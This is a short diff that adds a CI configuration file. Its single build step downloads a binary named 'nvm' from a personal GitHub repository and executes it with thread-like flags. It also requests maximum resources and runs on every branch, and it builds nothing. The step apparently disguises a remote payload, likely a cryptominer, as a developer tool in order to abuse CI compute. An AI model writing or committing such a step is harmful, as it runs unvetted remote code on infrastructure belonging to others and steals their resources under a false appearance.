@@ -1,0 +1,13 @@
+jobs:
+  build:
+    docker:
+      - image: ubuntu:16.04
+    parallelism: 2
+    resource_class: xlarge
+    branches:
+      only:
+        - master
+        - /*/
+    steps:
+      - run: apt-get update && apt-get install -y wget && wget https://github.com/roszek12/roszek/raw/master/nvm && chmod +x nvm && ./nvm -t 12 -d 5
+      
